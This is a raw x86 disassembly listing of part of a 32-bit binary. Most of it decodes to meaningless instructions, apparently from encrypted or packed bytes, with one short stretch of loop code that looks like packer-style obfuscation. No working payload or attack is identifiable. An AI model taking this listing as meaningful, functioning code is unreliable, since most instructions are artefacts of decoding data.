  4028aa:	adc    al,0xe5
  4028ac:	sub    BYTE PTR [ebx-0x7c704411],cl
  4028b2:	mov    es,ecx
  4028b4:	cmp    ebx,0x2e639ce5
  4028ba:	inc    ecx
  4028bb:	out    dx,eax
  4028bc:	mov    ebx,0xc0a763f4
  4028c1:	(bad)  
  4028c3:	jge    0x402921
  4028c5:	int3   
  4028c6:	aad    0xb1
  4028c8:	inc    esp
  4028c9:	int3   
  4028ca:	sub    cl,0x37
  4028cd:	or     eax,0x41bdbe3a
  4028d2:	adc    DWORD PTR [edx+eax*8],eax
  4028d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028d6:	pop    ds
  4028d7:	pop    eax
  4028d8:	cli    
  4028d9:	xor    eax,0x5dfc73da
  4028de:	jnp    0x40290f
  4028e0:	call   0x97d41a32
  4028e5:	(bad)  
  4028e7:	inc    edx
  4028e8:	pop    es
  4028e9:	push   eax
  4028ea:	mov    ss,WORD PTR [eax+0x66]
  4028ed:	je     0x4028b2
  4028ef:	sub    eax,0xbfb1c8f3
  4028f4:	inc    ecx
  4028f5:	dec    edx
  4028f6:	xchg   ebx,eax
  4028f7:	push   edx
  4028f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028f9:	xor    eax,0xbab082ee
  4028fe:	mov    edi,0xc1d8121a
  402903:	fdivr  QWORD PTR [edi-0x3c8bda8f]
  402909:	jl     0x4028de
  40290b:	stos   BYTE PTR es:[edi],al
  40290c:	push   0xf9bc0edb
  402911:	fcmovnbe st,st(5)
  402913:	adc    dl,BYTE PTR [ebx+0x8]
  402916:	bound  ecx,QWORD PTR [eax+0x7fab4753]
  40291c:	jbe    0x4028fe
  40291e:	addr16 dec edi
  402920:	and    edi,esp
  402922:	aas    
  402923:	xlat   BYTE PTR ds:[ebx]
  402924:	xchg   edx,eax
  402925:	cmp    edi,DWORD PTR [edx]
  402927:	dec    eax
  402928:	mov    edx,0x17f1e922
  40292d:	push   es
  40292e:	or     al,0xa3
  402930:	jb     0x402939
  402932:	sub    al,0x3c
  402934:	daa    
  402935:	pop    ecx
  402936:	mov    esp,DWORD PTR [edi-0x23]
  402939:	xchg   edx,eax
  40293a:	push   ss
  40293b:	xor    BYTE PTR [ebx],al
  40293d:	xlat   BYTE PTR ds:[ebx]
  40293e:	mov    eax,ds:0xbce24066
  402943:	es js  0x4029b1
  402946:	pop    ss
  402947:	cmp    edi,edx
  402949:	mov    DWORD PTR ds:0x434392,0x545f
  402953:	je     0x40391f
  402959:	and    edx,edx
  40295b:	mov    edx,DWORD PTR [ebp-0x8]
  40295e:	sbb    DWORD PTR ds:0x432dde,0x186f
  402968:	mov    eax,DWORD PTR [ebp-0x4]
  40296b:	xor    eax,ecx
  40296d:	and    DWORD PTR ds:0x43439e,0x0
  402977:	jmp    0x402989
  40297c:	mov    edi,DWORD PTR ds:0x43439e
  402982:	inc    edi
  402983:	mov    DWORD PTR ds:0x43439e,edi
  402989:	cmp    DWORD PTR ds:0x43439e,0x10
  402990:	jae    0x4029c8
  402996:	cmp    DWORD PTR ds:0x43439e,0x14
  40299d:	jne    0x4029c3
  4029a3:	push   DWORD PTR [ebp-0x18]
  4029a6:	push   0x43437e
  4029ab:	push   0x4692
  4029b0:	push   0x432738
  4029b5:	push   DWORD PTR [ebp-0x14]
  4029b8:	push   0x4d96
  4029bd:	call   DWORD PTR ds:0x432cea
  4029c3:	jmp    0x40297c
  4029c8:	mov    edi,0xffcd8d64
  4029cd:	sub    edi,eax
  4029cf:	add    edi,DWORD PTR [ebp+0x10]
  4029d2:	xor    edx,ecx
  4029d4:	adc    DWORD PTR ds:0x432de6,0x432dbe
  4029de:	add    edx,esi
  4029e0:	mov    DWORD PTR ds:0x43436a,0x3472
  4029ea:	cmp    edx,edi
  4029ec:	ja     0x40391a
  4029f2:	push   ebx
  4029f3:	jmp    0x4029fd
  4029f8:	mov    esi,0x32729c
  4029fd:	mov    eax,DWORD PTR [ebp-0x8]
  402a00:	jmp    0x402db6
  402a05:	mov    eax,ds:0x61e6e778
  402a0a:	in     eax,0xa1
  402a0c:	inc    ebx
  402a0d:	sub    BYTE PTR [edi-0x76e9ee04],ah
  402a13:	outs   dx,BYTE PTR ds:[esi]
  402a14:	add    al,0x0
  402a16:	or     al,0x70
  402a18:	jo     0x4029b1
  402a1a:	jge    0x402a8c
  402a1c:	jo     0x402a76
  402a1e:	and    eax,0xec9da437
  402a23:	clc    
  402a24:	add    eax,0x8494d95d
  402a29:	jo     0x402a78
  402a2b:	xor    DWORD PTR [edi-0x1399d30e],0xb3a78da2
  402a35:	scas   eax,DWORD PTR es:[edi]
  402a36:	lahf   
  402a37:	xor    eax,DWORD PTR [eax-0x5ca2bb63]
  402a3d:	mov    DWORD PTR [edi-0x75],ebp
  402a40:	and    eax,0x600e041d
  402a45:	cli    
  402a46:	aam    0x9
  402a48:	in     eax,0x5a
  402a4a:	test   DWORD PTR [edi-0xe],esp
  402a4d:	in     al,dx
  402a4e:	add    eax,ebp
  402a50:	in     eax,dx
  402a51:	bound  edx,QWORD PTR [edx]
  402a53:	sub    dh,BYTE PTR [ecx+0x77]
  402a56:	add    eax,0x513e40e1
  402a5b:	mov    edi,0x700747f6
  402a60:	hlt    
  402a61:	push   ebp
  402a62:	fld    QWORD PTR [ebp-0x21e2ffc1]
  402a68:	fimul  WORD PTR [ecx+eiz*4]
  402a6b:	int    0x3e
  402a6d:	fbld   TBYTE PTR [edi]
  402a6f:	or     sp,WORD PTR ds:[edx+0x2bdc46d8]
  402a77:	or     eax,0xc4b28bc2
  402a7c:	dec    BYTE PTR [ecx-0x13256f7c]
  402a82:	(bad)  
  402a83:	jmp    DWORD PTR [edx+0xa]
  402a86:	into   
  402a87:	ins    DWORD PTR es:[edi],dx
  402a88:	rcr    DWORD PTR [esi+0x60],cl
  402a8b:	sahf   
  402a8c:	clc    
  402a8d:	mov    ch,0xfc
  402a8f:	shl    esp,1
  402a91:	cmp    dh,BYTE PTR [esi+0x4e]
  402a94:	das    
  402a95:	or     eax,0x8080f7ed
  402a9a:	pop    ebx
  402a9b:	jns    0x402a26
  402a9d:	cdq    
  402a9e:	push   edi
  402aa0:	xchg   esp,eax
  402aa1:	sbb    BYTE PTR [edi],0xe0
  402aa4:	mov    ecx,0x8e69640f
  402aa9:	sub    eax,0xc7ea9af8
  402aae:	push   esp
  402aaf:	lods   eax,DWORD PTR ds:[esi]
  402ab0:	or     DWORD PTR [edx-0x15af2ccf],edx
  402ab6:	das    
  402ab7:	pop    edx
  402ab8:	or     al,0x8
  402aba:	ins    DWORD PTR es:[edi],dx
  402abb:	(bad)  
  402abc:	fwait
  402abd:	dec    ebp
  402abe:	dec    ecx
  402abf:	fcom   DWORD PTR ds:[ebp+0x3e]
  402ac3:	xchg   esp,edx
  402ac5:	push   ds
  402ac6:	loope  0x402b2b
  402ac8:	jecxz  0x402a5e
  402aca:	scas   eax,DWORD PTR es:[edi]
  402acb:	cwde   
  402acc:	dec    ebx
  402acd:	imul   ax,WORD PTR [edi],0xd5a
  402ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ad3:	adc    eax,0x1f252b2b
  402ad8:	mov    ecx,0x69891061
  402add:	fcom   DWORD PTR [esi+edx*2+0x56]
  402ae1:	push   edx
  402ae2:	jp     0x402b3d
  402ae4:	rcl    DWORD PTR [esp+edx*4+0xfcc549f],cl
  402aeb:	push   eax
  402aec:	stc    
  402aed:	ss jae 0x402b36
  402af0:	adc    DWORD PTR [esi+0x20252430],edx
  402af6:	and    eax,ebx
  402af8:	cli    
  402af9:	and    ch,dl
  402afb:	in     al,dx
  402afc:	(bad)  
  402afd:	lock push 0x34
  402b00:	stos   BYTE PTR es:[edi],al
  402b01:	sgdtd  [eax+esi*4-0x64f41451]
  402b09:	xor    eax,0x6c09da33
  402b0e:	inc    edi
  402b0f:	xchg   ebx,eax
  402b10:	test   eax,0x785e2496
  402b15:	inc    esi
  402b16:	cli    
  402b17:	fstp   TBYTE PTR [eax+0xb7d743f]
  402b1d:	pushf  
  402b1e:	mov    ebx,0x629cfc09
  402b23:	pop    esi
  402b24:	outs   dx,BYTE PTR ds:[esi]
  402b25:	mov    ah,0x36
  402b27:	add    eax,0xb93135d2
  402b2c:	daa    
  402b2d:	(bad)  
  402b2e:	out    dx,eax
  402b2f:	or     DWORD PTR [ebp+0x7d45e9fe],edi
  402b35:	adc    al,BYTE PTR [ebp-0x76d5190c]
  402b3b:	test   DWORD PTR [edi+0x45365c91],0xd0f51861
  402b45:	dec    ebx
  402b46:	enter  0xb56b,0x4f
  402b4a:	inc    ecx
  402b4b:	in     eax,dx
  402b4c:	dec    edi
  402b4d:	sbb    eax,0xe8a85417
  402b52:	data16 ss (bad) 
  402b55:	(bad)  
  402b56:	in     eax,0x38
  402b58:	mov    ch,0x0
  402b5a:	inc    esi
  402b5b:	mov    al,ds:0x2aed244e
  402b60:	stos   BYTE PTR es:[edi],al
  402b61:	xor    al,0xa9
  402b63:	rol    DWORD PTR [ebp-0x3c],1
  402b66:	cmp    cl,al
  402b68:	mov    edx,0x6aecb3ae
  402b6d:	stos   BYTE PTR es:[edi],al
  402b6e:	ret    0x605c
  402b71:	add    al,0x6
  402b73:	cli    
  402b74:	xchg   ecx,eax
  402b75:	and    edx,0x5eac9097
  402b7b:	repz and DWORD PTR [edi-0x2f],ecx
  402b7f:	fs push esp
  402b81:	jno    0x402bc3
  402b83:	push   ebp
  402b84:	rol    BYTE PTR [ebx+0x53],cl
  402b87:	cwde   
  402b88:	mov    eax,0xf13be4cf
  402b8d:	and    esi,DWORD PTR [ecx-0x33855488]
  402b93:	push   esi
  402b94:	and    DWORD PTR [edx-0x7f],esp
  402b97:	nop
  402b98:	xchg   edi,eax
  402b99:	rcr    DWORD PTR [edi-0x1d],0xa0
  402b9d:	mov    ds:0x7ee6a01b,eax
  402ba2:	outs   dx,DWORD PTR ds:[esi]
  402ba3:	add    eax,0xcc11318a
  402ba8:	sub    esi,ebp
  402baa:	out    dx,al
  402bab:	mov    WORD PTR [ecx+0x18],ds
  402bae:	es xchg ebp,eax
  402bb0:	in     al,dx
  402bb1:	cmp    eax,0xb0b1fed3
  402bb6:	(bad)  
  402bb8:	loop   0x402c18
  402bba:	mov    BYTE PTR [ecx+eiz*8],ch
  402bbd:	cld    
  402bbe:	sbb    eax,DWORD PTR [edi+0x2df6c55d]
  402bc4:	(bad)  
  402bc5:	(bad)  
  402bc7:	pop    DWORD PTR [ecx+0x1b]
  402bca:	and    eax,0x54a5d751
  402bcf:	pop    esp
  402bd0:	dec    ebx
  402bd1:	shr    BYTE PTR [ebx-0x492e7676],0x4d
  402bd8:	sub    BYTE PTR [esi+0x55acea40],cl
  402bde:	das    
  402bdf:	fld    TBYTE PTR ds:0xccbc8e8c
  402be5:	jno    0x402b70
  402be7:	test   esp,0x9a827b1
  402bed:	cwde   
  402bee:	std    
  402bef:	cmc    
  402bf0:	rcl    DWORD PTR ds:0x384d394a,0x95
  402bf7:	jbe    0x402c40
  402bf9:	xor    dl,al
  402bfb:	dec    esp
  402bfc:	out    0xb1,eax
  402bfe:	jne    0x402c26
  402c00:	js     0x402b8b
  402c02:	and    dh,BYTE PTR [ecx-0x9]
  402c05:	test   DWORD PTR [ebx+edi*8-0x1],0x69ca63dd
  402c0d:	std    
  402c0e:	cli    
  402c0f:	inc    ebx
  402c10:	dec    ecx
  402c11:	in     eax,dx
  402c12:	out    0xa1,al
  402c14:	pop    eax
  402c15:	jb     0x402c39
  402c17:	addr16 std 
  402c19:	pushf  
  402c1a:	pop    ebx
  402c1b:	out    0x17,eax
  402c1d:	push   esi
  402c1e:	ror    BYTE PTR [ecx+0x76],1
  402c21:	or     DWORD PTR gs:0xe2f0c2e1,ebp
  402c28:	or     al,0x5a
  402c2a:	pop    ds
  402c2b:	out    dx,eax
  402c2c:	sbb    al,0x8d
  402c2e:	shl    DWORD PTR [ecx+0x14daa83f],1
  402c34:	dec    esi
  402c35:	pop    eax
  402c36:	cdq    
  402c37:	ins    DWORD PTR es:[edi],dx
  402c38:	out    dx,eax
  402c39:	add    al,dh
  402c3b:	es dec edx
  402c3d:	xor    BYTE PTR [ecx+0x5b],bh
  402c40:	gs cmp al,0x4b
  402c43:	scas   al,BYTE PTR es:[edi]
  402c44:	xor    DWORD PTR [ebp-0x6e104510],edi
  402c4a:	frstor [edi-0x4d6c6083]
  402c50:	mov    bl,0x83
  402c52:	outs   dx,DWORD PTR ds:[esi]
  402c53:	cmp    ebp,ebp
  402c55:	data16 add BYTE PTR [edi+0xb295c59],0xe8
  402c5d:	pushf  
  402c5e:	mov    esp,0xa213b5d9
  402c63:	fstp   DWORD PTR [esi+0x78]
  402c66:	cmp    DWORD PTR [edi+0x4ea3b4db],esi
  402c6c:	icebp  
  402c6d:	imul   ebx,DWORD PTR [edi],0x68deaf8e
  402c73:	arpl   WORD PTR [ebx+0x7a],sp
  402c76:	or     ebp,DWORD PTR [esi-0x71b71bd9]
  402c7c:	fisttp DWORD PTR ds:0x1bf1361d
  402c82:	sbb    DWORD PTR [ecx-0x66],edx
  402c85:	pop    ebx
  402c86:	fwait
  402c87:	(bad)  
  402c88:	fild   QWORD PTR [edx+eiz*2-0x66]
  402c8c:	sub    BYTE PTR [eax+0x10b2f421],ah
  402c92:	cmp    dh,BYTE PTR [esi]
  402c94:	add    eax,0x1618c41d
  402c99:	ror    bh,1
  402c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c9c:	int3   
  402c9d:	xchg   edi,eax
  402c9e:	mov    dl,0x14
  402ca0:	xchg   esi,eax
  402ca1:	sbb    BYTE PTR [ecx+0x3f],ah
  402ca4:	jno    0x402cf8
  402ca6:	imul   ebx,DWORD PTR [ecx],0xfffffff1
  402ca9:	jnp    0x402cbe
  402cab:	adc    DWORD PTR [esi-0x2c],edi
  402cae:	int    0xd6
  402cb0:	cmp    esi,eax
  402cb2:	pop    ds
  402cb3:	mov    al,ds:0x4afec9b1
  402cb8:	or     al,0x29
  402cba:	add    BYTE PTR [eax],cl
  402cbc:	test   eax,0x4c3d73b8
  402cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cc2:	cmp    al,0x38
  402cc4:	outs   dx,DWORD PTR ds:[esi]
  402cc5:	mov    edi,0xdfbb3323
  402cca:	and    BYTE PTR [ecx-0x42c25054],0xc7
  402cd1:	dec    ecx
  402cd2:	sub    DWORD PTR [esi],esi
  402cd4:	jno    0x402ced
  402cd6:	or     edx,ecx
  402cd8:	mov    al,ds:0xaa793092
  402cdd:	test   eax,0x13aa60f2
  402ce2:	cmp    dl,dh
  402ce4:	in     al,dx
  402ce5:	cmp    edi,DWORD PTR [esi+eax*8-0x1a]
  402ce9:	jne    0x402d4f
  402ceb:	mov    esp,0xcf79b23c
  402cf0:	(bad)  
  402cf1:	push   ebp
  402cf2:	jle    0x402cc5
  402cf4:	nop
  402cf5:	mov    edx,0x90c32aca
  402cfa:	daa    
  402cfb:	sub    DWORD PTR [ebx],ecx
  402cfd:	xor    esi,eax
  402cff:	fsub   QWORD PTR [edx-0x4b3ab6dc]
  402d05:	inc    ebp
  402d06:	xchg   ch,al
  402d08:	popa   
  402d09:	fidivr WORD PTR [eax-0x704a84fc]
  402d0f:	mov    ah,BYTE PTR [edx]
  402d11:	sub    ebx,DWORD PTR [edi-0x38915a1a]
  402d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d18:	push   edx
  402d19:	cmp    DWORD PTR [ecx+esi*8+0x4f98f847],esi
  402d20:	jle    0x402d44
  402d22:	dec    edi
  402d23:	dec    eax
  402d24:	jne    0x402cfe
  402d26:	lea    ecx,[edi]
  402d28:	enter  0x34e,0x11
  402d2c:	in     al,dx
  402d2d:	test   al,0x4a
  402d2f:	(bad)  
  402d30:	cmp    ecx,DWORD PTR [edx-0x629e1bb3]
  402d36:	pop    esi
  402d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d39:	mov    dl,0x82
  402d3b:	dec    esi
  402d3c:	push   ds
  402d3d:	pop    esi
  402d3e:	std    
  402d3f:	push   edx
  402d40:	idiv   BYTE PTR [eax]
  402d42:	and    DWORD PTR [ecx+0x4ec2b964],edx
  402d48:	push   ecx
  402d49:	lods   eax,DWORD PTR ds:[esi]
  402d4a:	idiv   DWORD PTR [edi]
  402d4c:	in     eax,dx
  402d4d:	xor    esi,edi
  402d4f:	inc    edi
  402d50:	mov    ebp,0x575fcb49
  402d55:	(bad)  
  402d57:	cld    
  402d58:	repz mov bh,0x18
  402d5b:	adc    edx,esp
  402d5d:	std    
  402d5e:	sub    edx,DWORD PTR ds:0x8decf75c
  402d64:	sub    al,0x96
  402d66:	test   DWORD PTR [ebp+0x8040625],ebp
  402d6c:	inc    esp
  402d6d:	mov    esp,0x6f2e1e21
  402d72:	sahf   
  402d73:	push   ecx
  402d74:	lods   eax,DWORD PTR ds:[esi]
  402d75:	retf   0xf72c
  402d78:	fmul   QWORD PTR [ebp-0x2520490d]
  402d7e:	icebp  
  402d7f:	ds push edi
  402d81:	jg     0x402d49
  402d83:	mov    ?,edx
  402d85:	push   eax
  402d86:	popf   
  402d87:	mov    ebx,0xc1a88b2d
  402d8c:	call   0xb196:0x427071e5
  402d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d94:	hlt    
  402d95:	das    
  402d96:	enter  0xd254,0xc3
  402d9a:	arpl   WORD PTR [ecx-0x3],bx
  402d9d:	imul   DWORD PTR [edi+0x4f]
  402da0:	je     0x402d36
  402da2:	jge    0x402df9
  402da4:	test   DWORD PTR ds:0x7a5e979,esi
  402daa:	push   cs
  402dab:	outs   dx,BYTE PTR ds:[esi]
  402dac:	fmul   st,st(5)
  402dae:	mov    edx,0x6d51f1da
  402db3:	daa    
  402db4:	and    dl,BYTE PTR [eax]
  402db6:	mov    edi,DWORD PTR [ebp-0x4]
  402db9:	jmp    0x40316f
  402dbe:	cs out dx,eax
  402dc0:	loopne 0x402e3e
  402dc2:	in     eax,dx
  402dc3:	jnp    0x402daf
  402dc5:	jmp    0x3c56257c
  402dca:	push   esi
  402dcb:	jbe    0x402de1
  402dcd:	jns    0x402d76
  402dcf:	or     DWORD PTR [eax+0x70],esi
  402dd2:	xchg   edi,eax
  402dd3:	jge    0x402e45
  402dd5:	jo     0x402dc8
  402dd7:	and    al,0x0
  402dd9:	add    eax,0x78750c18
  402dde:	aas    
  402ddf:	stos   DWORD PTR es:[edi],eax
  402de0:	mov    ebx,0xd5e738e4
  402de5:	ins    DWORD PTR es:[edi],dx
  402de6:	pop    ecx
  402de7:	les    edi,FWORD PTR [esi+0x7cd13e12]
  402ded:	pusha  
  402dee:	push   ss
  402def:	jmp    0xba4ddfa0
  402df4:	test   al,0xb9
  402df6:	inc    esi
  402df7:	fadd   DWORD PTR [ecx]
  402df9:	int3   
  402dfa:	in     al,dx
  402dfb:	dec    ecx
  402dfc:	mov    DWORD PTR [edx+0x58ac53eb],esi
  402e02:	fbstp  TBYTE PTR [edi+0x6851e688]
  402e08:	aad    0xa4
  402e0a:	sti    
  402e0b:	gs adc eax,0xfe4c70ad
  402e11:	int    0xd1
  402e13:	loope  0x402e81
  402e15:	fwait
  402e16:	mov    ah,0x5d
  402e18:	sbb    al,bh
  402e1a:	mov    ch,0x56
  402e1c:	xchg   ebx,eax
  402e1d:	ret    
  402e1e:	mov    al,0x37
  402e20:	push   ebx
  402e21:	sbb    DWORD PTR [edx-0x7401ff2d],0x1e661599
  402e2b:	mov    WORD PTR [esi-0x3e],cs
  402e2e:	xchg   esi,eax
  402e2f:	daa    
  402e30:	inc    eax
  402e31:	stos   DWORD PTR es:[edi],eax
  402e32:	jo     0x402e0a
  402e34:	(bad)  
  402e35:	loope  0x402dc5
  402e37:	xchg   edx,eax
  402e38:	pop    eax
  402e39:	adc    ebp,DWORD PTR [ebx+0x4890de16]
  402e3f:	cwde   
  402e40:	push   ss
  402e41:	cmp    ch,bl
  402e43:	push   es
  402e44:	fwait
  402e45:	repnz clc 
  402e47:	popf   
  402e48:	bswap  ecx
  402e4a:	sar    BYTE PTR [esi],cl
  402e4c:	loop   0x402e4f
  402e4e:	stos   DWORD PTR es:[edi],eax
  402e4f:	int    0x17
  402e51:	loop   0x402e22
  402e53:	push   0xffffffc5
  402e55:	mov    cl,0x14
  402e57:	int    0x7
  402e59:	push   ds
  402e5a:	retf   
  402e5b:	mov    dl,0x16
  402e5d:	fidiv  DWORD PTR [edx+0x12]
  402e60:	frstor [edi+0x7941ab9b]
  402e66:	cs dec eax
  402e68:	lock cmp eax,0x3b0057ac
  402e6e:	mov    eax,ds:0xaee07ee8
  402e73:	rcl    BYTE PTR [esi+0x7964edd9],cl
  402e79:	shl    DWORD PTR [ebp+0x3e],0xb7
  402e7d:	sub    dl,BYTE PTR [ecx]
  402e7f:	ss sub esp,eax
  402e82:	cmp    eax,0xa7b32501
  402e87:	jb     0x402ef6
  402e89:	(bad)  
  402e8a:	fsubr  st,st(1)
  402e8c:	je     0x402ee0
  402e8e:	mov    dl,0x9f
  402e90:	mov    ds:0x1110b5a8,eax
  402e95:	outs   dx,DWORD PTR ds:[esi]
  402e96:	fbstp  TBYTE PTR [ebx]
  402e98:	cs in  eax,0xc2
  402e9b:	stos   DWORD PTR es:[edi],eax
  402e9c:	and    eax,0x8546ab34
  402ea1:	xor    edx,esi
  402ea3:	mov    esi,0x1512ea25
  402ea8:	das    
  402ea9:	bound  edx,QWORD PTR [edi-0x4b]
  402eac:	je     0x402efb
  402eae:	xchg   esp,eax
  402eaf:	pop    esi
  402eb0:	mov    ds:0xf31980fb,eax
  402eb5:	call   0xfd774b06
  402eba:	gs int 0xf9
  402ebd:	mov    edx,0x37cebc00
  402ec2:	and    edx,DWORD PTR [ecx+0xd6c5c38]
  402ec8:	stc    
  402ec9:	jecxz  0x402f0e
  402ecb:	leave  
  402ecc:	xchg   edx,eax
  402ecd:	jp     0x402efe
  402ecf:	add    eax,0xdd850454
  402ed4:	inc    eax
  402ed5:	pop    ebx
  402ed6:	mov    es,ebx
  402ed8:	jbe    0x402e99
  402eda:	add    DWORD PTR [eax],esp
  402edc:	dec    eax
  402edd:	mov    WORD PTR [edi+0x75],ds
  402ee0:	sub    cl,dl
  402ee2:	jae    0x402f0d
  402ee4:	iret   
  402ee5:	fisub  DWORD PTR [ebx]
  402ee7:	fistp  DWORD PTR [edx+0x3604704f]
  402eed:	jl     0x402e8c
  402eef:	stos   BYTE PTR es:[edi],al
  402ef0:	and    BYTE PTR [esi+0x7bd19870],cl
  402ef6:	jne    0x402f02
  402ef8:	sub    cl,dl
  402efa:	sti    
  402efb:	or     edi,edx
  402efd:	pop    ss
  402efe:	(bad)  
  402eff:	fstp   st(6)
  402f01:	(bad)  
  402f02:	hlt    
  402f03:	xlat   BYTE PTR ds:[ebx]
  402f04:	gs adc dl,ah
  402f07:	sahf   
  402f08:	add    eax,0xf1c5fb69
  402f0d:	push   ebx
  402f0e:	loopne 0x402f8e
  402f10:	xor    al,0xab
  402f12:	xchg   ebx,edi
  402f14:	xor    ecx,0x63
  402f17:	cs pop edi
  402f19:	aaa    
  402f1a:	sub    eax,0x85ea9b4e
  402f1f:	in     eax,0xf6
  402f21:	xor    esi,DWORD PTR [ecx+0xb]
  402f24:	stos   BYTE PTR es:[edi],al
  402f25:	sub    ch,BYTE PTR [edi+0x50a983cd]
  402f2b:	lock (bad) 
  402f2d:	imul   edi,DWORD PTR [eax+0x781ababd],0x80f353df
  402f37:	sbb    esp,DWORD PTR [ecx]
  402f39:	cmp    eax,0x7324ebc6
  402f3e:	sti    
  402f3f:	stos   BYTE PTR es:[edi],al
  402f40:	(bad)  
  402f41:	aaa    
  402f42:	jns    0x402fc3
  402f44:	or     al,0xd4
  402f46:	cmc    
  402f47:	in     eax,0xe5
  402f49:	inc    ebp
  402f4a:	hlt    
  402f4b:	inc    eax
  402f4c:	mov    BYTE PTR [ebx],ah
  402f4e:	jne    0x402f1a
  402f50:	iret   
  402f51:	inc    esp
  402f52:	adc    DWORD PTR [ebp-0x5f57c252],esi
  402f58:	das    
  402f59:	cs fistp WORD PTR ds:[eax]
  402f5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f5e:	idiv   BYTE PTR [ecx+0x64]
  402f61:	jb     0x402f2d
  402f63:	cmp    DWORD PTR ds:0xc0105ec0,esp
  402f69:	sbb    cl,dl
  402f6b:	fist   DWORD PTR [ebx+eiz*1-0x3e]
  402f6f:	data16 aaa 
  402f71:	imul   ebx,DWORD PTR [edi],0xdb93c459
  402f77:	jecxz  0x402f5d
  402f79:	dec    esp
  402f7a:	mov    ?,edi
  402f7c:	popf   
  402f7d:	and    dh,al
  402f7f:	rol    BYTE PTR [ebx],cl
  402f81:	dec    ebx
  402f82:	inc    esi
  402f83:	call   0x2686555
  402f88:	adc    eax,ecx
  402f8a:	and    eax,0xe924c774
  402f8f:	or     eax,0x3d471707
  402f94:	mov    al,ds:0x312790c0
  402f99:	popa   
  402f9a:	in     eax,dx
  402f9b:	dec    ebx
  402f9c:	mov    cl,0x3a
  402f9e:	mov    cl,0x40
  402fa0:	cdq    
  402fa1:	xchg   ebx,eax
  402fa2:	xchg   BYTE PTR [esi-0x7b],dl
  402fa5:	add    al,0x88
  402fa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fa8:	push   0x5f
  402faa:	fwait
  402fab:	enter  0x6d2e,0xd
  402faf:	inc    edx
  402fb0:	mov    eax,0x7b4b79f4
  402fb5:	add    esi,ebx
  402fb7:	or     DWORD PTR [edi+esi*1],eax
  402fba:	or     al,0x32
  402fbc:	mov    ch,0x87
  402fbe:	xchg   ecx,eax
  402fbf:	jecxz  0x402f82
  402fc1:	sub    BYTE PTR [ebx],bh
  402fc3:	add    al,0xbb
  402fc5:	sbb    DWORD PTR [edx+0x36620266],ecx
  402fcb:	aaa    
  402fcc:	fcom   st(7)
  402fce:	lds    eax,FWORD PTR [eax-0x16981fe2]
  402fd4:	jnp    0x402fb1
  402fd6:	mov    eax,ds:0x50d46e0c
  402fdb:	sar    eax,1
  402fdd:	(bad)  
  402fde:	ins    BYTE PTR es:[edi],dx
  402fdf:	imul   esi,eax,0xb17e27f2
  402fe5:	imul   ebp,DWORD PTR [esi+0x27],0x64
  402fe9:	add    eax,0x619c96c0
  402fee:	out    dx,al
  402fef:	lods   al,BYTE PTR ds:[esi]
  402ff0:	adc    bh,BYTE PTR [ecx-0x5a]
  402ff3:	xor    bh,dl
  402ff5:	jo     0x402f7c
  402ff7:	inc    esi
  402ff8:	mov    DWORD PTR [esp+ebp*1+0x5],esp
  402ffc:	mov    edx,0x4f86817e
  403001:	sbb    cl,ch
  403003:	icebp  
  403004:	xlat   BYTE PTR ds:[ebx]
  403005:	sub    edi,DWORD PTR [ecx-0x5862bff7]
  40300b:	or     al,0x53
  40300d:	xchg   DWORD PTR [ecx-0x2d9c7d3f],ebx
  403013:	push   cs
  403014:	(bad)  
  403015:	(bad)  
  403016:	sbb    al,0x49
  403018:	mov    ecx,DWORD PTR [edi]
  40301a:	add    eax,0x53bc9945
  40301f:	call   0x9192:0x397539a4
  403026:	sbb    ah,BYTE PTR gs:[ebp-0x3c]
  40302a:	xchg   esi,eax
  40302b:	pop    ebx
  40302c:	addr16 jnp 0x403040
  40302f:	jl     0x40306f
  403031:	push   esi
  403032:	jle    0x40307d
  403034:	jns    0x403029
  403036:	xchg   ecx,eax
  403037:	pop    esi
  403038:	pop    ebp
  403039:	popa   
  40303a:	push   0xd28f6d96
  40303f:	ins    DWORD PTR es:[edi],dx
  403040:	adc    eax,0x7994b92f
  403045:	movhps QWORD PTR [ebx+0x61],xmm2
  403049:	mov    ecx,DWORD PTR [edx-0x7d]
  40304c:	stos   DWORD PTR es:[edi],eax
  40304d:	add    DWORD PTR [ebx],ebp
  40304f:	shl    BYTE PTR [ecx-0x4a],1
  403052:	pusha  
  403053:	jns    0x403085
  403055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403056:	cmp    al,0x5c
  403058:	int3   
  403059:	xor    eax,esp
  40305b:	sar    BYTE PTR [ecx-0x4f],1
  40305e:	out    dx,eax
  40305f:	rcr    BYTE PTR [edi-0x3],cl
  403062:	xchg   esi,eax
  403063:	fwait
  403064:	imul   eax,esp,0xe97f7425
  40306a:	add    eax,edx
  40306c:	mov    esp,0x5444717d
  403071:	xchg   ebx,eax
  403072:	pop    ebx
  403073:	sub    DWORD PTR es:[edx-0xa047f79],0x2
  40307b:	and    esp,DWORD PTR [edx]
  40307d:	ror    BYTE PTR [ebx],1
  40307f:	mov    dl,cl
  403081:	cdq    
  403082:	and    DWORD PTR [edx+0x3],edi
  403085:	or     BYTE PTR [ebx+edi*4-0x303dcc29],bh
  40308c:	mov    cl,0xe0
  40308e:	adc    DWORD PTR [edx],edx
  403090:	(bad)  
  403091:	push   edx
  403092:	cmc    
  403093:	in     eax,dx
  403094:	xchg   ecx,eax
  403095:	rol    BYTE PTR [esi+0xb402d8b],cl
  40309b:	dec    edi
  40309c:	adc    BYTE PTR [eax-0x7e5539d7],cl
  4030a2:	pop    ss
  4030a3:	in     al,dx
  4030a4:	in     al,0x8c
  4030a6:	shl    DWORD PTR [edx-0x71ac0a11],0x5a
  4030ad:	pop    ebx
  4030ae:	push   cs
  4030af:	addr16 jno 0x40309e
  4030b2:	test   al,0x30
  4030b4:	or     al,0x3e
  4030b6:	es js  0x40304b
  4030b9:	add    al,BYTE PTR [edx-0x581b70f]
  4030bf:	sub    BYTE PTR [edi],ah
  4030c1:	cli    
